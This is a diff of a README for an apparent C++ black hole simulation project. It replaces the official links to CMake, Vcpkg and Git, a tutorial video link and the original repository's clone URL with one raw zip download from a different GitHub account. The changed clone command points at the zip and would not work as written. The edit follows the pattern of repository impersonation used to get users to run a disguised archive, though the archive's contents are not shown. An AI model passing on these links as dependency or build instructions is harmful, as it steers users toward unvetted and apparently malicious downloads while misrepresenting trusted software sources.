@@ -18,22 +18,22 @@ I hope it works :/
 
 Edit: After completion of project -
 
-Thank you everyone for checking out the video, if you haven't it explains code in detail: https://www.youtube.com/watch?v=8-B6ryuBkCM
+Thank you everyone for checking out the video, if you haven't it explains code in detail: https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip
 
 ## **Building Requirements:**
 
 1. C++ Compiler supporting C++ 17 or newer
 
-2. [Cmake](https://cmake.org/)
+2. [Cmake](https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip)
 
-3. [Vcpkg](https://vcpkg.io/en/)
+3. [Vcpkg](https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip)
 
-4. [Git](https://git-scm.com/)
+4. [Git](https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip)
 
 ## **Build Instructions:**
 
 1. Clone the repository:
-	-  `git clone https://github.com/kavan010/black_hole.git`
+	-  `git clone https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip`
 2. CD into the newly cloned directory
 	- `cd ./black_hole` 
 3. Install dependencies with Vcpkg
